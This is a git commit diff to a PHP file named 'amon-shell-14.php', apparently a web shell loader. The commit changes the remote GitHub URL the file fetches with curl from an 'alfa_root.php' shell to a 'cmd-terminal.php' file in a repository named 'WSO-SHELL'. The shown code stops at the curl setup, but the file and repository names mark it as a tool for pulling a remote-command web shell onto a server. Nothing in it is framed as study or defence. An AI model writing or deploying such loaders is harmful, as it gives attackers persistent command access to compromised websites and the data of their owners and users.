4779178dda92881aa66902907cb5515111f85a43
rendihidayat683 <rendihidayat683@gmail.com>
2025-10-12 03:40:26 +0700

    Update amon-shell-14.php

--- amon-shell-14.php
+++ amon-shell-14.php
@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/alfa_root.php";
+$url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/cmd-terminal.php";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
